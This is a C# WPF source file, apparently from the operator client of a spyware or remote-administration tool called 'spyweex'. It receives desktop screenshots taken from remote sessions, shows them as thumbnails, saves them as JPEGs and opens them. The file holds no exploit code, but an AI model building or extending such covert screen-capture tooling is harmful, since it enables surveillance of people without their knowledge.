using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Windows;
using System.Windows.Media.Imaging;
using System.Windows.Threading;

namespace spyweex_client_wpf.Subscribers
{
    public class DesktopScreenListener : ISubscriber
    {
        public void Subscribe(WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(Scheduler.CurrentThread).
                SkipWhile(response => !response.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_DESKTOP_SCREEN)).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    
                    using (MemoryStream byteStream = new MemoryStream(resp.content))
                    {
                        BitmapImage bi = new BitmapImage();
                        bi.BeginInit();
                        bi.CacheOption = BitmapCacheOption.OnLoad;
                        bi.StreamSource = byteStream;
                        bi.EndInit();
                        bi.Freeze();

                        JpegBitmapEncoder encoder = new JpegBitmapEncoder();
                        //Guid photoID = System.Guid.NewGuid();
                        String photolocation = "Screenshot_" + DateTime.Now.ToString(CultureInfo.CurrentCulture).Replace(" ", "_").Replace(":","-") + "_id_" + ".jpg";

                        // update thumbnail
                        BitmapFrame biFrame = BitmapFrame.Create(bi);
                        wxhtpClient._viewModel.SelectedSession.BiFrame = biFrame;

                        // save downloaded picture
                        encoder.Frames.Add(biFrame);
                        using (var filestream = new FileStream(photolocation, FileMode.Create))
                            encoder.Save(filestream);

                        byteStream.Close();
                        Process.Start(photolocation);

                        UnsubscribeAsync();
                        Debug.WriteLine("Task Completed");
                    }
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Desktop screen subscriber " + (Exception)err);
                    //UnsubscribeAsync();
                }

                );
            subscriberToken = idisp;
        }

    }

}